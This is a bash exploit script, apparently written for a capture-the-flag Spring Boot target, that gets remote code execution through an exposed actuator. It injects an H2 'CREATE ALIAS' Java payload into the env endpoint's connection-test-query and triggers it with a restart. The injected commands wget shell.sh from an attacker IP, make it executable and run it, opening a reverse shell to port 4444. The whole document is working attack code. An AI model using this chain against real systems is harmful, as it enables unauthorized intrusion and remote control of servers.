#!/bin/bash

# Create a shell.sh file
# Set up a listener in port 4444
# Map host spring.thm

ip="172.16.0.21"
attacker_ip="xxx.xxx.xxx.xxx"
target_url="https://spring.thm"
header="x-9ad42dea0356cb04: $ip"

function generate_payload() {
    local cmd="$1"
    echo "CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('${cmd}');"
}

function inject_payload() {
    local payload="$1"
    echo "                                                     "
    echo "[*]                              Injecting payload..."

    curl -s -X 'POST' \
         -H 'Content-Type: application/json' \
         -H "$header" \
         --data-binary "{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"$payload\"}" \
         "$target_url/actuator/env" -k

    echo -e "\n                            Payload Sent"
}

function restart_app() {
    echo "[*] Triggering application restart..."
    curl -s -X 'POST' \
         -H 'Content-Type: application/json' \
         -H "$header" \
         "$target_url/actuator/restart" -k

    echo -e "\n                            Restart triggered. Waiting 15s for execution ..."
    sleep 15
}

echo -e "\n                            Downloading shell.sh"
PAYLOAD=$(generate_payload "wget http://$attacker_ip/shell.sh -O /tmp/shell.sh")
inject_payload "$PAYLOAD"
restart_app

echo -e "\n                            chmod +x shell.sh"
PAYLOAD=$(generate_payload "chmod +x /tmp/shell.sh")
inject_payload "$PAYLOAD"
restart_app

echo -e "\n                            Executing shell.sh"
echo -e "\n[!]                         GUarantee that your Listener is up in port 4444"
PAYLOAD=$(generate_payload "bash /tmp/shell.sh")
inject_payload "$PAYLOAD"
restart_app

echo -e "\n[+]                         DONE."